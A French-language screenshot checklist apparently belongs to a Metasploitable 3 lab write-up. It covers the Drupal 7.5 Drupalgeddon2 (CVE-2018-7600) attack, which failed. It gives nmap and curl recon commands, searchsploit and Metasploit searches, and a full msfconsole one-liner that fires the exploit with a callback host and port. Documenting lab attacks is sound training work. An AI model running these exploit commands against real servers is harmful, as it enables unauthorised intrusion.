# Captures — Drupal 7.5 Drupalgeddon2 (MS3, bloqué)

Consignes de capture pour `services/ms3-drupal.html`. Commandes identiques à celles du
write-up source : `ms3/jules/drupal.md`.

## 01-recon-version.png

Les deux commandes à la suite :
```bash
nmap -sC -sV -p 80 172.28.128.3
curl -s http://172.28.128.3/drupal/CHANGELOG.txt | head -2
```

Encadrer en rouge : la liste des 4 applis dans `http-ls` et la ligne `Drupal 7.5,
2011-07-27`.

## 02-recherche-module.png

```bash
searchsploit drupal 7
msfconsole -q -x "search drupal 7; exit"
msfconsole -q -x "info exploit/unix/webapp/drupal_drupalgeddon2; exit"
```

Encadrer en rouge : `exploit/unix/webapp/drupal_drupalgeddon2` et
`https://nvd.nist.gov/vuln/detail/CVE-2018-7600`.

## 03-exploit-msf-echec.png

```bash
msfconsole -q -x "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS 172.28.128.3; set TARGETURI /drupal/; set LHOST 172.28.128.1; set LPORT 4448; exploit -z; exit -y"
```

Encadrer en rouge : `Exploit completed, but no session was created`.

## 04-curl-manuel.png

Les deux commandes `curl` à la suite (voir write-up pour la syntaxe complète avec le
token et le form_build_id). Encadrer en rouge : `Undefined index: #value in
file_ajax_upload()` dans la réponse JSON de la deuxième requête.
